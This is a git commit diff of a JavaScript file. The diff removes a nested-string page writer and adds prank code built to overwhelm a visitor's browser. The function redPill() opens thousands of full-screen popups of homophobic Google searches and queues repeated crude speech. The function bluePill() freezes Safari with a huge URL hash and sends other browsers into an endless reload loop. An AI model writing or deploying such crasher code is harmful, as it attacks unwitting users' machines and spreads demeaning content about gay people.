585ec64d95b89dba5f49d3fbfe77e5d04772059e
bob1330 <115032889+bob1330@users.noreply.github.com>
2024-09-27 18:25:11 -0400

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,14 @@
-data:text/html,<script>var text="",g=200;for(var i=1;i<=g;i++){text+="^{"+i}text=text.slice(2)+"}".repeat(g-1);document.write(text)</script>
+var msg = new SpeechSynthesisUtterance();
+msg.text = "hairybolls360 hairybolls360 hairybolls360 hairybolls360 hairybolls360 hairybolls360 hairybolls360 hairybolls360 hairybolls360 hairybolls360 hairybolls360 hairybolls360 hairybolls360 hairybolls360 hairybolls360 hairybolls360 hairybolls360 hairybolls360 hairybolls360 hairybolls360 hairybolls360 hairybolls360 hairybolls360 hairybolls360 hairybolls360 hairybolls360 hairybolls360 hairybolls360 hairybolls360 hairybolls360";
+function redPill() {
+    for (let i=0; i<10000; i++) {
+        window.speechSynthesis.speak(msg);
+        var funnyWindow = window.open("https://google.com/search?q=why+am+I+gay?", "", "width=1920, height=1080");
+        var funnyWindow2 = window.open("https://google.com/search?q=how+to+not+be+gay", "", "width=1920, height=1080");
+        var funnyWindow3 = window.open("https://google.com/search?q=amongus+cheeks+4k", "", "width=1920, height=1080");
+        var funnyWindow4 = window.open("https://google.com/search?q=cute+boys+near+me", "", "width=1920, height=1080");
+      }
+}
+function bluePill() {
+    if(/^((?!chrome|android).)*safari/i.test(navigator.userAgent))onload=()=>location.hash="M"+"\u0001".repeat(2**25)+"m";else{for(;;)location.reload(1)}
+}
